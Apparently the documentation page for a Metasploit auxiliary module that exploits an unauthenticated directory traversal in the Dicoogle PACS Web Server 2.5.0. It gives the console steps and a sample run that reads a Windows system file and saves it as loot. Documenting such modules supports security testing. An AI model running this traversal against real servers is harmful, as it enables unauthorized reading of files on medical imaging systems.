## Description

This module exploits an unauthenticated directory traversal vulnerability
in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an
attacker to read arbitrary files with the web server privileges.
While the application is java based, the directory traversal was only
successful against Windows targets.


## Verification Steps

  1. Start `msfconsole`
  2. `use auxiliary/scanner/http/dicoogle_traversal`
  3. `set RHOSTS [IP]`
  4. `run`

## Scenarios

### Tested on Windows 2012 with Dicoogle 2.5.0 on Java 8 update 151

  ```
  msf5 > use auxiliary/scanner/http/dicoogle_traversal 
  msf5 auxiliary(scanner/http/dicoogle_traversal) > set rhosts 1.1.1.1
  rhosts => 1.1.1.1
  msf5 auxiliary(scanner/http/dicoogle_traversal) > run
  
  [+] ; for 16-bit app support
  [fonts]
  [extensions]
  [mci extensions]
  [files]
  [Mail]
  MAPI=1
  
  [+] File saved in: /root/.msf4/loot/20180721210736_default_1.1.1.1_dicoogle.travers_903795.txt
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```
